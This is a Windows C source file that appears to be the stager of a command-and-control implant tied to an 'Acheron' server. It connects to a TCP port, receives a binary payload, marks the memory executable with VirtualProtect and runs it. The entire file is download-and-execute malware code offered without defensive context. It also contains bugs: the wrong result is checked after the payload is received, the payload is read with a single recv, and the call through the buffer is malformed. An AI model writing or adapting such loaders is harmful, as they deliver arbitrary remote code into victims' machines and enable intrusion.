#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")


int main() {
    //init winsock
    WSADATA winSocketData;
    int startupResult;
    startupResult = WSAStartup(MAKEWORD(2, 2), &winSocketData);
    if (startupResult != 0) {
        fprintf(stderr, "STARTUP ERROR");
        WSACleanup();
    }

    //get addr info
    struct addrinfo* result = NULL, hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    int addrInfoResult = getaddrinfo("127.0.0.1", "7777", &hints, &result);
    if (addrInfoResult != 0) {
        fprintf(stderr, "INVALID ADDRINFO");
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    //init socket
    SOCKET sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "INVALID SOCKET");
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    //connect socket
    int connectionResult = connect(sock, result->ai_addr, (int)result->ai_addrlen);
    if (connectionResult == SOCKET_ERROR) {
        fprintf(stderr, "CONNECTION FAILURE");
        closesocket(sock);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
    printf("CONNECTED TO ACHERON INSTANCE");
    freeaddrinfo(result);

    //recv size
    size_t size = 0;
    int sizeResult = recv(sock, (char*)&size, sizeof(size_t), 0);
    if (sizeResult <= 0) {
        fprintf(stderr, "SIZE RECV FAILURE");
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    printf("BINARY SIZE: %i", size);

    //ack size
    int ackResult = send(sock, (char*)&size, sizeof(size), 0);
    if (ackResult <= 0) {
        fprintf(stderr, "ACK SEND FAILURE");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    //malloc buffer for binary
    void* buffer = malloc(size);
    if (buffer == NULL) {
        fprintf(stderr, "MALLOC FAILURE");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    //recv binary
    int recvResult = recv(sock, (char*)buffer, size, 0);
    if (ackResult <= 0) {
        fprintf(stderr, "RECV FAILURE");
        free(buffer);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    //set buffer to executable
    DWORD oldProtect;
    int protectResult = VirtualProtect(buffer, size, PAGE_EXECUTE, &oldProtect);
    if (protectResult == 0) {
        fprintf(stderr, "PROTECT FAILURE");
        free(buffer);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    //execute
    printf("EXECUTING");
    (void(*)())(buffer)();

    //cleanup
    free(buffer);
    closesocket(sock);
    WSACleanup();

    return 0;
}
